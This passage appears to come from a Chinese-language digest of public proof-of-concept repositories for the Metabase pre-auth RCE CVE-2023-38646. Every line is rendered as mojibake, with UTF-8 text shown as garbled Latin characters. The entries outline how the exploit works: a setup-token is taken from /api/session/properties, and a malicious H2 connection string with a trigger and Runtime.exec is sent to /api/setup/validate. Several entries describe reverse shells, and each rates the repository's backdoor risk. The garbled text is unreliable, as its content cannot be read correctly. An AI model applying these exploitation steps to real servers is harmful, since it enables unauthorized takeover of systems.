2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

